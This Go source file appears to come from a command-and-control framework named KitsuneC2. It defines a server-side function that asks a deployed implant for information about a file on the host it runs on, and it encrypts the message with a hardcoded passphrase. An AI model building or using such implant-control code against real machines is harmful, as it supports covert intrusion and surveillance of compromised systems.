// this file contains all requests that the server can send to an implant. Note that these functions don't close their passed connections, as
// these are not "handlers",

package main

import (
	"KitsuneC2/lib/communication"
	"net"
)

func RequestFileInfo(conn net.Conn, pathToFile string) error {
	req := communication.FileInfoReq{PathToFile: pathToFile}
	err := communication.SendEnvelopeToImplant(conn, 11, req, []byte("thisis32bitlongpassphraseimusing"))
	if err != nil {
		return err
	} else {
		return nil
	}
}
